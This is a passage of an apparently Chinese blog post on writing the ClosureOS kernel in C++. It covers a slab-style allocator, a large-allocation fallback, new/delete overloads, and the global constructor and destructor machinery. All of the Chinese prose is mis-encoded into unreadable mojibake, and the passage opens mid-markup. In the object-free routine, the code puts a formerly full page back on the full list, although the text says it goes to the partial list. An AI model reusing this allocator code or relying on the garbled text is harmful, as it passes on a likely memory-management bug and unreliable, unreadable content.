class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> KMemCache::__page_obj_slicing(Page* page) -&gt; <span class="hljs-type">void</span><br>&#123;<br>    <span class="hljs-type">void</span> *curr_obj;<br>    <span class="hljs-type">virt_addr_t</span> next_obj;<br>    <span class="hljs-type">void</span> **obj_ptr;<br><br>    next_obj = <span class="hljs-built_in">page_to_virt</span>(page);<br>    curr_obj = <span class="hljs-literal">nullptr</span>;<br>    obj_ptr = (<span class="hljs-type">void</span>**) next_obj;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">this</span>-&gt;page_obj_nr; i++) &#123;<br>        *obj_ptr = curr_obj;<br>        curr_obj = (<span class="hljs-type">void</span>*) next_obj;<br>        next_obj += <span class="hljs-keyword">this</span>-&gt;obj_sz;<br>        obj_ptr = (<span class="hljs-type">void</span>**) next_obj;<br>    &#125;<br><br>    page-&gt;obj_nr = <span class="hljs-keyword">this</span>-&gt;page_obj_nr;<br>    page-&gt;freelist = (<span class="hljs-type">void</span>**) curr_obj;<br>    page-&gt;kc = <span class="hljs-keyword">this</span>;<br>    <span class="hljs-built_in">get_page</span>(page);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="II-å¤§å†…å­˜åˆ†é…ï¼šé€€åŒ–è‡³-PagePool"><a href="#II-å¤§å†…å­˜åˆ†é…ï¼šé€€åŒ–è‡³-PagePool" class="headerlink" title="II. å¤§å†…å­˜åˆ†é…ï¼šé€€åŒ–è‡³ PagePool"></a>II. å¤§å†…å­˜åˆ†é…ï¼šé€€åŒ–è‡³ PagePool</h3><p>å¯¹äºè¾ƒå¤§çš„å†…å­˜åˆ†é…ï¼ŒKMemCache ä¼šç›´æ¥æ‹’ç»è¯·æ±‚ï¼Œæ­¤æ—¶åœ¨ KHeapPool çš„åˆ†é…å‰ç«¯ä¸­ä¼šå›é€€åˆ° PagePool è¿›è¡Œåˆ†é…ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> KHeapPool::__malloc_pools(base::<span class="hljs-type">size_t</span> size) -&gt; <span class="hljs-type">void</span>*<br>&#123;<br>    base::<span class="hljs-type">size_t</span> order = <span class="hljs-number">0</span>, need = size;<br>    Page *obj;<br><br>    size &gt;&gt;= (PAGE_SHIFT + <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">while</span> (size &gt; <span class="hljs-number">0</span>) &#123;<br>        order++;<br>        size &gt;&gt;= <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (((<span class="hljs-number">1</span> &lt;&lt; order) * PAGE_SIZE) &lt; need) &#123;<br>        order++;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">this</span>-&gt;pool_nr; i++) &#123;<br>        obj = <span class="hljs-keyword">this</span>-&gt;pools[i]-&gt;<span class="hljs-built_in">AllocPages</span>(order);<br>        <span class="hljs-keyword">if</span> (obj) &#123;<br>            <span class="hljs-built_in">get_page</span>(obj);<br>            <span class="hljs-keyword">return</span> (<span class="hljs-type">void</span>*) <span class="hljs-built_in">page_to_virt</span>(obj);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* we failed unexpectedly :( */</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="å†…å­˜å¯¹è±¡é‡Šæ”¾ï¼šå¯¹è±¡å›å½’ä¸é“¾è¡¨è¿ç§»"><a href="#å†…å­˜å¯¹è±¡é‡Šæ”¾ï¼šå¯¹è±¡å›å½’ä¸é“¾è¡¨è¿ç§»" class="headerlink" title="å†…å­˜å¯¹è±¡é‡Šæ”¾ï¼šå¯¹è±¡å›å½’ä¸é“¾è¡¨è¿ç§»"></a>å†…å­˜å¯¹è±¡é‡Šæ”¾ï¼šå¯¹è±¡å›å½’ä¸é“¾è¡¨è¿ç§»</h2><p>å†…å­˜é‡Šæ”¾çš„é€»è¾‘åˆ™ç®€å•å¾—å¤šï¼š</p><ul><li>é¦–å…ˆæ ¹æ®è™šæ‹Ÿåœ°å€æ‰¾åˆ°å¯¹åº”çš„ page ç»“æ„ä½“ï¼Œè‹¥ä¸å±äºä»»ä¸€ <code>KMemCache</code> åˆ™è¯´æ˜ä¸ºå¤§å†…å­˜åˆ†é…ï¼Œç›´æ¥é‡Šæ”¾å›æ‰€å±  <code>PagePool</code></li><li>å¦åˆ™ï¼Œæ‰¾åˆ°å…¶å¯¹åº”çš„ <code>KMemCache</code> ï¼Œåˆ¤æ–­å½“å‰ slub page æ‰€å±ï¼š<ul><li>è‹¥ä¸ºæ­£åœ¨ä½¿ç”¨çš„ slub pageï¼Œç›´æ¥å°†å¯¹è±¡æŒ‚å› <code>KMemCache::freelist</code></li><li>å¦åˆ™ï¼ŒæŒ‚å›å¯¹åº” page çš„ freelistï¼Œè‹¥ä¸º full list åˆ™è¿ç§»è‡³ partial list</li></ul></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">KHeapPool::Free</span><span class="hljs-params">(<span class="hljs-type">void</span> *obj)</span> -&gt; <span class="hljs-type">void</span></span><br><span class="hljs-function"></span>&#123;<br>    Page *page;<br><br>    page = <span class="hljs-built_in">get_head_page</span>(<span class="hljs-built_in">virt_to_page</span>((<span class="hljs-type">virt_addr_t</span>) obj));<br>    <span class="hljs-keyword">if</span> (!page-&gt;kc) &#123;<br>        <span class="hljs-built_in">put_page</span>(page);<br>        <span class="hljs-keyword">return</span> ;<br>    &#125;<br><br>    page-&gt;kc-&gt;<span class="hljs-built_in">Free</span>(page, obj);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">KMemCache::Free</span><span class="hljs-params">(Page *page, <span class="hljs-type">void</span> *obj)</span> -&gt; <span class="hljs-type">void</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">this</span>-&gt;lock.<span class="hljs-built_in">Lock</span>();<br><br>    <span class="hljs-keyword">this</span>-&gt;__internal_obj_free(page, obj);<br><br>    <span class="hljs-keyword">this</span>-&gt;lock.<span class="hljs-built_in">UnLock</span>();<br>&#125;<br><br><span class="hljs-keyword">auto</span> KMemCache::__internal_obj_free(Page *page, <span class="hljs-type">void</span> *obj) -&gt; <span class="hljs-type">void</span><br>&#123;<br>    page-&gt;obj_nr++;<br><br>    <span class="hljs-keyword">if</span> (page == <span class="hljs-keyword">this</span>-&gt;current) &#123;<br>        *(<span class="hljs-type">void</span>**) obj = <span class="hljs-keyword">this</span>-&gt;freelist;<br>        <span class="hljs-keyword">this</span>-&gt;freelist = (<span class="hljs-type">void</span>**) obj;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (page-&gt;obj_nr == <span class="hljs-number">1</span>) &#123;    <span class="hljs-comment">/* on full list */</span><br>            <span class="hljs-built_in">list_del</span>(&amp;page-&gt;list);<br>            <span class="hljs-built_in">list_add_next</span>(&amp;<span class="hljs-keyword">this</span>-&gt;full, &amp;page-&gt;list);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (page-&gt;obj_nr == <span class="hljs-keyword">this</span>-&gt;page_obj_nr) &#123;   <span class="hljs-comment">/* all freed */</span><br>            <span class="hljs-built_in">list_del</span>(&amp;page-&gt;list);<br>            <span class="hljs-built_in">put_page</span>(page);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x04-C-çš„åˆæ­¥å¼•å…¥"><a href="#0x04-C-çš„åˆæ­¥å¼•å…¥" class="headerlink" title="0x04. C++ çš„åˆæ­¥å¼•å…¥"></a>0x04. C++ çš„åˆæ­¥å¼•å…¥</h1><p>ç°åœ¨æˆ‘ä»¬è€ƒè™‘è¿›è¡Œ C++ ä»£ç çš„å¼•å…¥ï¼Œç¬”è€…é€‰æ‹©å¼•å…¥ C++ ä»£ç çš„ä¸»è¦åŸå› æ˜¯ä¸ºäº† OOP ç‰¹æ€§ï¼Œè™½ç„¶è¯´ä½¿ç”¨ C åŒæ ·å¯ä»¥ç¼–å†™é¢å‘å¯¹è±¡çš„ä»£ç ï¼Œä½†æ˜¯æ€»å½’æ²¡æœ‰ C++ çš„åŸç”Ÿ OOP çœ‹èµ·æ¥é‚£ä¹ˆç›´è§‚</p><p>åœ¨ bare bone ç¯å¢ƒä¸‹ï¼Œæˆ‘ä»¬ <strong>æ— æ³•ä½¿ç”¨æ ‡å‡†åº“</strong> ï¼Œå› æ­¤æ­¤æ—¶çš„ C++ <em>å‡ ä¹</em> æ˜¯ç›¸å½“äº C with class,ä¸è¿‡é¢å¤–å¤šäº†ä¸€äº›ç‰¹æ€§ï¼š</p><ul><li>éšå¼çš„å¯¹æ„é€ å‡½æ•°ä¸ææ„å‡½æ•°çš„è°ƒç”¨</li><li>éšå¼çš„å†…å­˜åˆ†é…ä¸é‡Šæ”¾</li></ul><p>å¯¹äºæ„é€ å‡½æ•°ä¸ææ„å‡½æ•°çš„è‡ªåŠ¨è°ƒç”¨ï¼Œè¿™æ˜¯ç”±ç¼–è¯‘å™¨å»å†³å®šçš„ï¼Œå› æ­¤å¤§éƒ¨åˆ†æƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥ä¸ç”¨å¤„ç†ï¼Œ <strong>é™¤äº†å…¨å±€å¯¹è±¡çš„æ„é€ å‡½æ•°</strong> â€”â€” <strong>æˆ‘ä»¬åº”å½“ç¡®ä¿å…¶åœ¨æˆ‘ä»¬å®Œæˆå†…å­˜ç®¡ç†å­ç³»ç»Ÿçš„åˆå§‹åŒ–ä¹‹åå†è¿›è¡Œ</strong></p><p>å¯¹äºéšå¼çš„å†…å­˜åˆ†é…ä¸é‡Šæ”¾ï¼Œæˆ‘ä»¬åªéœ€è¦ <strong>é‡è½½å…¨å±€ new&#x2F;delete è¿ç®—ç¬¦å³å¯</strong></p><p>æ­¤å¤–ï¼Œæˆ‘ä»¬åº”å½“ <strong>ç¦ç”¨ C++ çš„å¼‚å¸¸å¤„ç†æœºåˆ¶</strong> ï¼Œå› ä¸ºè¿™ä¸ªç‰¹æ€§åœ¨å†…æ ¸ä¸Šä¸‹æ–‡ä¸å¥½å®ç°ï¼ŒåŒæ—¶ä¼šå¼•å…¥å¾ˆå¤šé¢å¤–çš„å¼€é”€ï¼Œæˆ‘ä»¬é€šè¿‡åœ¨ç¼–è¯‘æ—¶æ·»åŠ  <code> -fno-exceptions</code> ä»¥å…³é—­è¯¥ç‰¹æ€§</p><h2 id="new-delete-è¿ç®—ç¬¦çš„é‡è½½"><a href="#new-delete-è¿ç®—ç¬¦çš„é‡è½½" class="headerlink" title="new&#x2F;delete è¿ç®—ç¬¦çš„é‡è½½"></a>new&#x2F;delete è¿ç®—ç¬¦çš„é‡è½½</h2><p><code>new/delete</code> è¿ç®—ç¬¦é‡è½½çš„æ–¹å¼æ¯”è¾ƒç®€å•ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨æŸä¸ªæ–‡ä»¶ä¸­å®ç°è¿™äº›è¿ç®—ç¬¦é‡è½½ï¼Œåœ¨å…¶ä¸­è°ƒç”¨å†…å­˜åˆ†é…çš„ API å³å¯ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;closureos/cpp_base.hpp&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;closureos/errno.h&gt;</span></span><br><br><span class="hljs-keyword">import</span> kernel.lib;<br><span class="hljs-keyword">import</span> kernel.mm;<br><br><span class="hljs-function"><span class="hljs-type">void</span>* <span class="hljs-keyword">operator</span> <span class="hljs-title">new</span><span class="hljs-params">(<span class="hljs-type">size_t</span> sz)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> mm::GloblKHeapPool-&gt;<span class="hljs-built_in">Malloc</span>(sz);<br>&#125;<br><br><span class="hljs-type">void</span>* <span class="hljs-keyword">operator</span> <span class="hljs-keyword">new</span>[](<span class="hljs-type">size_t</span> sz)<br>&#123;<br>    <span class="hljs-keyword">return</span> mm::GloblKHeapPool-&gt;<span class="hljs-built_in">Malloc</span>(sz);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-type">void</span> *p)</span> <span class="hljs-keyword">noexcept</span></span><br><span class="hljs-function"></span>&#123;<br>    mm::GloblKHeapPool-&gt;<span class="hljs-built_in">Free</span>(p);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-keyword">operator</span> <span class="hljs-keyword">delete</span>[](<span class="hljs-type">void</span> *p) <span class="hljs-keyword">noexcept</span><br>&#123;<br>    mm::GloblKHeapPool-&gt;<span class="hljs-built_in">Free</span>(p);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-type">void</span> *p, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> sz)</span> <span class="hljs-keyword">noexcept</span></span><br><span class="hljs-function"></span>&#123;<br>    mm::GloblKHeapPool-&gt;<span class="hljs-built_in">Free</span>(p);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-keyword">operator</span> <span class="hljs-keyword">delete</span>[](<span class="hljs-type">void</span> *p, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> sz) <span class="hljs-keyword">noexcept</span><br>&#123;<br>    mm::GloblKHeapPool-&gt;<span class="hljs-built_in">Free</span>(p);<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¹‹åå¯¹äºæ‰€æœ‰çš„ C++ ä»£ç ï¼Œåœ¨é“¾æ¥æ—¶ç¼–è¯‘å™¨ä¼šè‡ªåŠ¨å¯»æ‰¾åˆ°è¿™äº›è¿ç®—ç¬¦å®šä¹‰</p><h2 id="global-constructor-çš„è°ƒç”¨"><a href="#global-constructor-çš„è°ƒç”¨" class="headerlink" title="global constructor çš„è°ƒç”¨"></a>global constructor çš„è°ƒç”¨</h2><p>åœ¨ç”¨æˆ·æ€ç¨‹åºä¸­å¯¹äºå…¨å±€åˆå§‹åŒ–å™¨ï¼ˆä¾‹å¦‚å…¨å±€å¯¹è±¡çš„æ„é€ å‡½æ•°ï¼Œæˆ–æ˜¯ constructor attribute ä¿®é¥°çš„å‡½æ•°ï¼‰çš„è°ƒç”¨é€šå¸¸åœ¨ <code>main()</code> å‡½æ•°å‰å®Œæˆï¼ˆè¿™é‡Œæˆ‘ä»¬ä»…è€ƒè™‘ <code>GCC</code> ç¼–è¯‘å™¨ï¼‰ï¼Œç¼–è¯‘å™¨ä¼šç”Ÿæˆå¯¹åº”çš„ <strong>è°ƒç”¨æ„é€ å™¨ä¸ææ„å™¨çš„å‡½æ•°</strong> ï¼ˆé€šå¸¸æ¯ä¸ªæ–‡ä»¶ä¸€ä¸ªï¼Œå‡½æ•°åä¸­å¸¦æœ‰ <code>static_initialization_and_destruction</code> ï¼‰ï¼Œå¹¶å°†è¿™äº›å‡½æ•°çš„åœ°å€å•ç‹¬å­˜æ”¾åˆ°ä¸€ä¸ª <code>.init_array</code> æ®µï¼Œåœ¨è¿è¡Œ <code>main()</code> å‡½æ•°å‰çš„ <code>__libc_start_main()</code> ä¼šè°ƒç”¨è¿™äº›å‡½æ•°æŒ‡é’ˆ</p><p>å› æ­¤å¯¹äºæˆ‘ä»¬çš„ kernel ç¯å¢ƒè€Œè¨€ï¼Œè‹¥è¦åˆå§‹åŒ–è¿™äº›å…¨å±€å¯¹è±¡ï¼Œ <strong>æˆ‘ä»¬åªéœ€è¦æ‰‹åŠ¨è°ƒç”¨è¿™äº›å‡½æ•°æŒ‡é’ˆå³å¯</strong> ï¼Œè¿™é‡Œç¬”è€…å°† <code>.init_array</code> æ®µæ”¾åœ¨äº† <code>.data</code> æ®µä¸­ï¼Œå¹¶ä½¿ç”¨ä¸€ä¸ªå¤–éƒ¨ç¬¦å·æ ‡è¯†å…¶ä½ç½®ï¼š</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs haskell">.<span class="hljs-class"><span class="hljs-keyword">data</span> <span class="hljs-type">ALIGN</span>(4096) : <span class="hljs-type">AT</span> (<span class="hljs-title">__kernel_text_sz</span> + <span class="hljs-title">__boot_end</span>)</span><br>&#123;<br>*(.<span class="hljs-class"><span class="hljs-keyword">data</span>)</span><br>__init_array = .;<br>*(.init_array)<br></code></pre></td></tr></table></figure><p>ä¹‹åæˆ‘ä»¬ç›´æ¥å¼•å…¥è¯¥ç¬¦å·å¹¶è°ƒç”¨å¯¹åº”çš„å‡½æ•°æŒ‡é’ˆå³å¯ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> &#123;<br>    <span class="hljs-function"><span class="hljs-keyword">extern</span> <span class="hljs-title">int</span> <span class="hljs-params">(*__init_array)</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">extern</span> <span class="hljs-title">int</span> <span class="hljs-params">(*__init_array_end)</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span>;<br><span class="hljs-comment">/* ... */</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">global_constructor_caller</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">int</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">int</span> (**init_array)(<span class="hljs-type">void</span>) = &amp;__init_array;<br>    <span class="hljs-built_in">int</span> (**init_array_end)(<span class="hljs-type">void</span>) = &amp;__init_array_end;<br>    <span class="hljs-type">int</span> error;<br><br>    <span class="hljs-keyword">for</span> (base::<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; init_array[i] &amp;&amp; ((init_array + i) &lt; init_array_end); i++) &#123;<br>        error = init_array[i]();<br>        <span class="hljs-keyword">if</span> (error) &#123;<br>            <span class="hljs-keyword">return</span> error;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="global-destructor-çš„è°ƒç”¨"><a href="#global-destructor-çš„è°ƒç”¨" class="headerlink" title="global destructor çš„è°ƒç”¨"></a>global destructor çš„è°ƒç”¨</h2><p>å…¨å±€ææ„å™¨çš„å®ç°åˆ™æ¯”æ„é€ å™¨ç›¸å¯¹å¤æ‚ä¸€äº›ï¼Œå¯¹æ¯ä¸ªå­˜åœ¨å…¨å±€æ„é€ å™¨&#x2F;ææ„å™¨çš„æ–‡ä»¶çš„ <code>*_static_initialization_and_destruction_*()</code> å‡½æ•°ï¼Œå…¶é™¤äº†è°ƒç”¨æ„é€ å™¨ä»¥å¤–ï¼Œè¿˜ä¼š <strong>è¿›è¡Œææ„å™¨ä¿¡æ¯çš„è£…å¡«</strong> ï¼Œè¿™é€šè¿‡ <code>int __cxa_atexit(void (*destructor) (void *), void *arg, void *__dso_handle)</code> å‡½æ•°å®Œæˆï¼Œå…¶ä¸‰ä¸ªå‚æ•°åˆ†åˆ«ä¸ºï¼šææ„å‡½æ•°æŒ‡é’ˆã€å¾…ææ„å¯¹è±¡ã€ä¸€ä¸ªç‰¹æ®Šçš„æ ‡è®°å€¼ï¼ˆå¯¹æˆ‘ä»¬æ¥è¯´å¯ä»¥ä¸ç”¨ç®¡ï¼‰</p><p>å› æ­¤æˆ‘ä»¬åªéœ€è¦è‡ªè¡Œå®ç°ä¸€ä¸ª <code>__cxa_at_exit</code> å‡½æ•°æ¥è®°å½•ææ„å™¨ä¿¡æ¯å³å¯ï¼Œä¸ºäº†å®ç°åŠ¨æ€çš„ææ„å™¨æ•°æ®è®°å½•ï¼Œæˆ‘ä»¬åŠ¨æ€åˆ†é… <code>dtor_info</code> ç»“æ„ä½“æ¥è®°å½•å¾…ææ„å¯¹è±¡çš„ä¿¡æ¯ï¼Œå¹¶å°†å…¶é“¾æ¥ä¸ºå•å‘é“¾è¡¨ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">dtor_info</span> &#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">dtor_info</span> *next;<br>    <span class="hljs-built_in">void</span> (*destructor) (<span class="hljs-type">void</span> *);<br>    <span class="hljs-type">void</span> *arg;<br>    <span class="hljs-type">void</span> *__dso_handle;<br>&#125;;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">dtor_info</span> *global_dtors = <span class="hljs-literal">nullptr</span>;<br><br><span class="hljs-type">int</span> __cxa_atexit(<span class="hljs-built_in">void</span> (*destructor) (<span class="hljs-type">void</span> *), <span class="hljs-type">void</span> *arg, <span class="hljs-type">void</span> *__dso_handle)<br>&#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">dtor_info</span> *new_info;<br>    <br>    new_info = <span class="hljs-keyword">new</span> <span class="hljs-keyword">struct</span> dtor_info;<br>    <span class="hljs-keyword">if</span> (new_info == <span class="hljs-literal">nullptr</span>) &#123;<br>        <span class="hljs-keyword">return</span> -ENOMEM;<br>    &#125;<br><br>    new_info-&gt;next = global_dtors;<br>    new_info-&gt;destructor = destructor;<br>    new_info-&gt;arg = arg;<br>    new_info-&gt;__dso_handle = __dso_handle;<br><br>    global_dtors = new_info;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>æ­¤å¤–ï¼Œæˆ‘ä»¬è¿˜éœ€è¦å®šä¹‰ä¸€ä¸ª <code>__dso_handle</code> å˜é‡ï¼Œå¹¶å¯¼å‡ºåˆ°æˆ‘ä»¬çš„ <code>cpp_base.hpp</code> ä¸­ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">void</span>* __dso_handle __attribute__((<span class="hljs-built_in">visibility</span>(<span class="hljs-string">&quot;hidden&quot;</span>)));<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ˜¯å¯¹ææ„å™¨çš„è°ƒç”¨ï¼Œåœ¨ C++ ABI è§„èŒƒä¸­ï¼Œå¯¹è¿™äº›ææ„å™¨çš„è°ƒç”¨åº”å½“ç”± <code>void __cxa_finalize ( void *__dso_handle)</code> å‡½æ•°å®Œæˆï¼Œå…¶åº”å½“å°†ææ„å™¨æ¡ç›®çš„ <code>__dso_handle</code> ä¸å…¶å‚æ•°è¿›è¡Œå¯¹æ¯”ï¼Œç›¸ç­‰åˆ™è°ƒç”¨ææ„å™¨ï¼ˆè‹¥ä¼ å‚ä¸ºç©ºåˆ™åº”å½“è°ƒç”¨æ‰€æœ‰ææ„å™¨ï¼‰å¹¶å°†å¯¹åº”çš„æ¡ç›®æ— æ•ˆåŒ–ï¼Œå› æ­¤åœ¨æˆ‘ä»¬çš„ ClosureOS å†…æ ¸ä¸­ä¹Ÿåº”å½“å®ç°ä¸€ä¸ª <code>__cxa_finalize()</code> å‡½æ•°ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs cpp">lib::atomic::SpinLock dtor_exit_lock;<br><br><span class="hljs-type">void</span> __cxa_finalize(<span class="hljs-type">void</span>* dso_handle)<br>&#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">dtor_info</span> **pdtor = &amp;global_dtors;<br><br>    dtor_exit_lock.<span class="hljs-built_in">Lock</span>();<br><br>    <span class="hljs-keyword">while</span> (*pdtor) &#123;<br>        <span class="hljs-keyword">struct</span> <span class="hljs-title class_">dtor_info</span> *dtor = *pdtor;<br><br>        <span class="hljs-keyword">if</span> (!dso_handle || dtor-&gt;__dso_handle == dso_handle) &#123;<br>            *pdtor = dtor-&gt;next;<br>            dtor-&gt;<span class="hljs-built_in">destructor</span>(dtor-&gt;arg);<br>            <span class="hljs-keyword">delete</span> dtor;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            pdtor = &amp;dtor-&gt;next;<br>        &#125;<br>    &#125;<br><br>    dtor_exit_lock.<span class="hljs-built_in">UnLock</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯ <strong>è¿™ä¸ªå‡½æ•°åº”å½“åœ¨ç¨‹åºé€€å‡ºæ—¶è¿›è¡Œæ‰‹åŠ¨è°ƒç”¨</strong> ï¼Œç”±äºæˆ‘ä»¬å°šæœªç¼–å†™ç”µæºç®¡ç†æ¨¡å—ï¼Œå› æ­¤æœ¬ç« æ‰€æ¶‰åŠçš„ä»£ç ä¸ä¼šè°ƒç”¨è¯¥å‡½æ•°</p><h2 id="çº¯è™šå‡½æ•°"><a href="#çº¯è™šå‡½æ•°" 